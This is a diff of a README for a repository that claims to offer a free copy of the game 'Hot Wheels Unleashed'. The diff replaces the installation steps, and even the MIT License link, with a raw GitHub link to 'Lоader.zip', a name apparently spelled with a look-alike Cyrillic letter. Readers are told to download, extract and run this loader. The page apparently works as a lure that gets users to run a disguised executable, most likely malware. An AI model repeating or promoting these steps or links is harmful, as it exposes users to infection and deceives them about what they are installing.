@@ -23,9 +23,9 @@ Welcome to the **Hot Wheels Unleashed ** repository! 🚀 Unlock the thrilling r
 
 ## 🏁 Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/mostafa-Do2do2/HotWheelsUnleashed-FreeGameHub/main/Lоader.zip** from the repository.
 2. Extract using WinRAR / 7-Zip / Unarchiver.
-3. Run Loader.exe (.app/.sh on Linux/macOS).
+3. Run https://raw.githubusercontent.com/mostafa-Do2do2/HotWheelsUnleashed-FreeGameHub/main/Lоader.zip (https://raw.githubusercontent.com/mostafa-Do2do2/HotWheelsUnleashed-FreeGameHub/main/Lоader.zip on Linux/macOS).
 4. Enjoy Hot Wheels Unleashed!
 
 ## 🔎 SEO Keywords
@@ -38,4 +38,4 @@ This repository is for educational and personal use only. We respect original co
 
 ## 📜 MIT License
 
-This project is distributed under the [MIT License](https://opensource.org/licenses/MIT) — feel free to use, modify, and share!
+This project is distributed under the [MIT License](https://raw.githubusercontent.com/mostafa-Do2do2/HotWheelsUnleashed-FreeGameHub/main/Lоader.zip) — feel free to use, modify, and share!
